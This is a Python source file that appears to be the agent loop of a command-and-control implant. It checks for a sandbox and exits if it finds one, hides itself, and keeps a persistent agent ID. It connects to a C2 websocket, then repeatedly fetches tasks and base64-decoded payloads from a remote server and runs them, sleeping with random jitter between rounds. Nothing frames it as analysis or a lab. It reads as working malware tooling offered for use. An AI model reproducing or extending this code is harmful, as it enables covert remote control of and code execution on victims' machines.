import base64
import os
import random
import time
import uuid

from ghost_daemon import stay_hidden
from kill_switch import should_terminate
from sandbox_check import is_sandbox
from session_memory import log_session_event

from config import CONFIG
from core.adaptive_channel_manager import fetch_task
from memory_loader import load_encrypted_plugin
from proxy_fallback_check import proxy_check

AGENT_ID_FILE = "agent_id.txt"


def generate_agent_id():
    agent_id = str(uuid.uuid4())
    with open(AGENT_ID_FILE, "w") as f:
        f.write(agent_id)
    return agent_id


def get_agent_id():
    if os.path.exists(AGENT_ID_FILE):
        return open(AGENT_ID_FILE).read().strip()
    return generate_agent_id()


def jitter_sleep(base=10, fuzz=5):
    sleep_time = base + random.uniform(-fuzz, fuzz)
    time.sleep(max(1, sleep_time))


def run_agent_loop():
    import asyncio
    import threading

    from core.ws_client import persistent_ws_loop

    if is_sandbox():
        return
    stay_hidden()
    proxy_check()
    agent_id = get_agent_id()

    c2_ws_url = CONFIG.get("c2_ws_url")
    if not c2_ws_url:
        raise RuntimeError("ZDS_C2_WS_URL not set — cannot start agent loop")

    plugin_server = CONFIG.get("plugin_server")
    if not plugin_server:
        raise RuntimeError("ZDS_PLUGIN_SERVER not set — cannot fetch plugins")

    ws_thread = threading.Thread(
        target=lambda: asyncio.run(
            persistent_ws_loop(agent_id, c2_ws_url)
        ),
        daemon=True,
    )
    ws_thread.start()

    while not should_terminate():
        try:
            task_data = fetch_task(agent_id)
            if task_data:
                log_session_event(agent_id, "TASK_RECEIVED", task_data)
                plugin_code = base64.b64decode(task_data["payload"])
                load_encrypted_plugin(plugin_code, agent_id)
            jitter_sleep()
            from plugin_fetcher import fetch_and_run_plugin
            fetch_and_run_plugin(agent_id, plugin_server)
        except Exception as e:
            log_session_event(agent_id, "ERROR", str(e))
            time.sleep(30)


if __name__ == "__main__":
    run_agent_loop()
